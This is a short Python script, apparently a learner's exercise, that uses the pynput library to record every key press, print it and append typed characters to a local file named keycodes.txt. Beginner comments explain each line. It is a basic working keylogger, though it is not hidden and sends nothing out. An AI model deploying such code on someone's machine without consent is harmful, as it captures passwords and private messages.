# This imports a python library, which will use the feature of the keyboard to it can record it.
from pynput import keyboard

#'def' = used to define a function
#'with open' = is a method to open, create and edit files
#Because the key is already given by the on_press as a parameter it's not really needed,
#But the print is just there to make sure that whatever key is being pressed gets converted into a string and displayed
def keyPressed(key):
    print(str(key))
    with open("keycodes.txt", 'a') as logKey:
        #The reason why it's a try it's because sometimes line 13 can bug out and give errors if there's spaces
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Oi there's a mistake")



#The file executes with python and if the program is ready (#5)
#listener is the object created and on_press means that whenever keyboard.Listener executes, it will log the information to '=keyPressed'
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
